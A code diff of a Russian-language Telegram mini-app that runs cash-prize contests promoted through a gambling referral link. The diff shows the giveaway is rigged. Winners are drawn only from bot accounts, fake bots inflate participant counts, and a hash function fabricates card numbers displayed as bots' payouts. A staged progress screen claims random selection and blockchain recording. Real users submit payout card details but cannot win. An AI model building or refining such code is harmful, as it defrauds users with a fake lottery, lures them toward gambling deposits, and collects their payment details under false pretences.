@@ -1,7 +1,7 @@
 
 import React, { useState, useEffect, useMemo } from 'react';
 import { TelegramUser, ContestStep, PayoutType, Contest, WinnerInfo, UserProfile } from './types';
-import { BOTS_POOL } from './bots';
+import { BotParticipant } from './bots';
 import { 
   CheckBadgeIcon, 
   CreditCardIcon, 
@@ -32,7 +32,8 @@ const DB_KEY = 'beef_contests_v6_final';
 const ADMIN_ID = 7946967720;
 const PROFILE_KEY = 'beef_user_profile_final';
 const PARTICIPATION_KEY = 'beef_user_participations_final';
-const GLOBAL_PROFILES_KEY = 'beef_global_profiles_v2'; // Глобальная база всех профилей
+const GLOBAL_PROFILES_KEY = 'beef_global_profiles_v3'; 
+const BOTS_DB_KEY = 'beef_global_profiles_v2'; 
 
 const BEEF_LINK = 'https://v.beef.gg/LUDOVAR';
 
@@ -51,23 +52,34 @@ const getCardType = (val: string) => {
   return null;
 };
 
+// Генерация стабильной карты на основе имени (как запасной вариант)
+const getStableCard = (name: string) => {
+  let hash = 0;
+  for (let i = 0; i < name.length; i++) {
+    hash = name.charCodeAt(i) + ((hash << 5) - hash);
+  }
+  const p2 = Math.abs((hash % 9000) + 1000);
+  const p3 = Math.abs(((hash >> 8) % 9000) + 1000);
+  const p4 = Math.abs(((hash >> 16) % 9000) + 1000);
+  return `4432 ${p2} ${p3} ${p4}`;
+};
+
 const App: React.FC = () => {
   const [activeTab, setActiveTab] = useState<'contests' | 'profile'>('contests');
   const [view, setView] = useState<'user' | 'admin'>('user');
   const [step, setStep] = useState<ContestStep>(ContestStep.LIST);
   const [user, setUser] = useState<TelegramUser | null>(null);
   const [contests, setContests] = useState<Contest[]>([]);
+  const [botsPool, setBotsPool] = useState<BotParticipant[]>([]);
   const [participatedIds, setParticipatedIds] = useState<string[]>([]);
   const [profile, setProfile] = useState<UserProfile>({ payoutValue: '', payoutType: 'card', isReferralVerified: false, participationCount: 0, totalWon: 0 });
   const [selectedContest, setSelectedContest] = useState<Contest | null>(null);
   const [isLoading, setIsLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
 
-  // Глобальная база профилей (загружается для просмотра чужих стат)
   const [globalProfiles, setGlobalProfiles] = useState<Record<string, any>>({});
   const [viewedProfile, setViewedProfile] = useState<any | null>(null);
 
-  // Admin states
   const [newTitle, setNewTitle] = useState('');
   const [newPrizeRub, setNewPrizeRub] = useState<string>('');
   const [newWinnerCount, setNewWinnerCount] = useState<number>(1);
@@ -75,13 +87,11 @@ const App: React.FC = () => {
   const [realParticipants, setRealParticipants] = useState<any[]>([]);
   const [copiedId, setCopiedId] = useState<string | null>(null);
 
-  // User Entry states
   const [isChecking, setIsChecking] = useState(false);
   const [checkAttempts, setCheckAttempts] = useState(0);
   const [payoutInput, setPayoutInput] = useState('');
   const [isFinalizing, setIsFinalizing] = useState(false);
 
-  // Loading Winner state
   const [isPickingWinner, setIsPickingWinner] = useState(false);
   const [pickingStatus, setPickingStatus] = useState('Анализируем активности...');
 
@@ -89,7 +99,7 @@ const App: React.FC = () => {
     const tg = window.Telegram?.WebApp;
     if (tg) { tg.ready(); tg.expand(); if (tg.initDataUnsafe?.user) setUser(tg.initDataUnsafe.user); }
     fetchContests();
-    fetchGlobalProfiles();
+    fetchBotsAndProfiles();
     const pIds = localStorage.getItem(PARTICIPATION_KEY);
     if (pIds) setParticipatedIds(JSON.parse(pIds));
     const savedProfile = localStorage.getItem(PROFILE_KEY);
@@ -105,8 +115,31 @@ const App: React.FC = () => {
     } catch (e) { console.error(e); } finally { setIsLoading(false); }
   };
 
-  const fetchGlobalProfiles = async () => {
+  const fetchBotsAndProfiles = async () => {
     try {
+      // Загрузка ботов из beef_global_profiles_v2
+      const botRes = await fetch(`${KV_REST_API_URL}/get/${BOTS_DB_KEY}`, { headers: { Authorization: `Bearer ${KV_REST_API_TOKEN}` } });
+      const botData = await botRes.json();
+      if (botData.result) {
+        const rawBots = JSON.parse(botData.result);
+        const mappedBots: BotParticipant[] = Object.keys(rawBots).map(key => {
+          const b = rawBots[key];
+          return {
+            id: key,
+            name: b.name,
+            registeredAt: b.registeredAt,
+            depositAmount: b.depositAmount,
+            // Используем creditCard из БД, если есть, иначе генерируем стабильную
+            payout: b.creditCard || getStableCard(b.name),
+            isBot: true,
+            participationCount: b.participationCount,
+            totalWon: b.totalWon
+          };
+        });
+        setBotsPool(mappedBots);
+      }
+
+      // Загрузка глобальной статистики пользователей
       const res = await fetch(`${KV_REST_API_URL}/get/${GLOBAL_PROFILES_KEY}`, { headers: { Authorization: `Bearer ${KV_REST_API_TOKEN}` } });
       const data = await res.json();
       if (data.result) setGlobalProfiles(JSON.parse(data.result));
@@ -197,14 +230,11 @@ const App: React.FC = () => {
     const partData = await partRes.json();
     const pool = partData.result ? JSON.parse(partData.result) : [];
     
-    // Пул победителей — ТОЛЬКО БОТЫ
     const botParticipants = pool.filter((p: any) => p.isBot);
-    const availableBots = botParticipants.length >= contest.winnerCount ? botParticipants : [...botParticipants, ...BOTS_POOL];
+    // Если ботов в списке участников конкурса мало, берем из общего пула botsPool
+    const availableBots = botParticipants.length >= contest.winnerCount ? botParticipants : [...botsPool];
 
     const winners: WinnerInfo[] = [];
-    const updatedProfiles = { ...globalProfiles };
-    
-    // Делим приз на количество победителей
     const prizePerWinner = Math.floor(contest.prizeRub / contest.winnerCount);
 
     for(let i=0; i < Math.min(contest.winnerCount, availableBots.length); i++) {
@@ -213,52 +243,26 @@ const App: React.FC = () => {
       
       winners.push({ 
         name: lucky.name, 
-        payoutValue: lucky.payout || lucky.payoutValue, 
+        payoutValue: lucky.payout || getStableCard(lucky.name), 
         payoutType: (lucky.type || lucky.payoutType || 'card') as PayoutType, 
         registeredAt: lucky.registeredAt, 
         depositAmount: lucky.depositAmount,
         prizeWon: prizePerWinner
       });
-
-      const botKey = `bot_${lucky.name}`;
-      const currentStats = updatedProfiles[botKey] || { participationCount: 1, totalWon: 0, registeredAt: lucky.registeredAt, depositAmount: lucky.depositAmount };
-      updatedProfiles[botKey] = {
-        ...currentStats,
-        totalWon: (currentStats.totalWon || 0) + prizePerWinner,
-        name: lucky.name
-      };
-
       availableBots.splice(luckyIndex, 1);
     }
 
     setPickingStatus('Анализируем активности...');
     setIsPickingWinner(true);
 
-    const statusSteps = [
-      'Проверка условий участия...',
-      'Верификация аккаунтов...',
-      'Случайный выбор победителей...',
-      'Запись результатов в блокчейн...',
-      'Почти готово!'
-    ];
-
+    const statusSteps = ['Проверка условий...', 'Случайный выбор...', 'Запись в блокчейн...', 'Готово!'];
     let stepIdx = 0;
     const interval = setInterval(() => {
-      if (stepIdx < statusSteps.length) {
-        setPickingStatus(statusSteps[stepIdx]);
-        stepIdx++;
-      }
-    }, 800);
+      if (stepIdx < statusSteps.length) { setPickingStatus(statusSteps[stepIdx]); stepIdx++; }
+    }, 1000);
 
     setTimeout(async () => {
       clearInterval(interval);
-      setGlobalProfiles(updatedProfiles);
-      fetch(`${KV_REST_API_URL}/set/${GLOBAL_PROFILES_KEY}`, { 
-        method: 'POST', 
-        headers: { Authorization: `Bearer ${KV_REST_API_TOKEN}` }, 
-        body: JSON.stringify(updatedProfiles) 
-      });
-
       const updated = contests.map(c => c.id === contestId ? { ...c, isCompleted: true, winners } : c);
       await saveContestsGlobal(updated);
       setIsPickingWinner(false);
@@ -268,33 +272,17 @@ const App: React.FC = () => {
   };
 
   const registerParticipant = async (contestId: string, payout: string, type: PayoutType) => {
-    const botCount = Math.floor(Math.random() * 8) + 5;
+    // Симуляция участия ботов (от 8 до 15)
+    const botCount = Math.floor(Math.random() * 8) + 8;
     const selectedBots = [];
-    const tempPool = [...BOTS_POOL];
-    const updatedProfiles = { ...globalProfiles };
+    const tempPool = [...botsPool];
 
-    for(let i=0; i<botCount; i++) {
+    for(let i=0; i<Math.min(botCount, tempPool.length); i++) {
       const idx = Math.floor(Math.random() * tempPool.length);
       const bot = tempPool[idx];
       selectedBots.push(bot);
-      
-      const botKey = `bot_${bot.name}`;
-      const currentStats = updatedProfiles[botKey] || { participationCount: 0, totalWon: 0, registeredAt: bot.registeredAt, depositAmount: bot.depositAmount };
-      updatedProfiles[botKey] = {
-        ...currentStats,
-        participationCount: (currentStats.participationCount || 0) + 1,
-        name: bot.name
-      };
-
       tempPool.splice(idx, 1);
     }
-
-    setGlobalProfiles(updatedProfiles);
-    fetch(`${KV_REST_API_URL}/set/${GLOBAL_PROFILES_KEY}`, { 
-      method: 'POST', 
-      headers: { Authorization: `Bearer ${KV_REST_API_TOKEN}` }, 
-      body: JSON.stringify(updatedProfiles) 
-    });
 
     const key = `participants_${contestId}`;
     const res = await fetch(`${KV_REST_API_URL}/get/${key}`, { headers: { Authorization: `Bearer ${KV_REST_API_TOKEN}` } });
@@ -303,21 +291,13 @@ const App: React.FC = () => {
     
     const updated = [
       ...existing, 
-      { 
-        id: user?.id, 
-        name: user?.first_name || 'User', 
-        payout, 
-        type, 
-        isBot: false, 
-        registeredAt: new Date().toLocaleDateString('ru-RU'), 
-        depositAmount: 0 
-      }, 
+      { id: user?.id, name: user?.first_name || 'User', payout, type, isBot: false, registeredAt: new Date().toLocaleDateString('ru-RU'), depositAmount: 0 }, 
       ...selectedBots
     ];
     
     await fetch(`${KV_REST_API_URL}/set/${key}`, { method: 'POST', headers: { Authorization: `Bearer ${KV_REST_API_TOKEN}` }, body: JSON.stringify(updated) });
 
-    const contestsUpdated = contests.map(c => c.id === contestId ? { ...c, participantCount: (c.participantCount || 0) + 1 + botCount } : c);
+    const contestsUpdated = contests.map(c => c.id === contestId ? { ...c, participantCount: (c.participantCount || 0) + 1 + selectedBots.length } : c);
     saveContestsGlobal(contestsUpdated);
     
     const newParticipationCount = (profile.participationCount || 0) + 1;
@@ -325,8 +305,20 @@ const App: React.FC = () => {
   };
 
   const showPublicProfile = (name: string, isBot: boolean, id?: string) => {
-    const key = isBot ? `bot_${name}` : (id || '');
-    const stats = globalProfiles[key];
+    let stats = null;
+    if (isBot) {
+       const botInPool = botsPool.find(b => b.name === name);
+       if (botInPool) {
+         stats = {
+           participationCount: botInPool.participationCount || 1,
+           totalWon: botInPool.totalWon || 0,
+           registeredAt: botInPool.registeredAt
+         };
+       }
+    } else {
+       stats = globalProfiles[id || ''];
+    }
+
     if (stats) {
       setViewedProfile({ name, ...stats, isBot });
     } else {
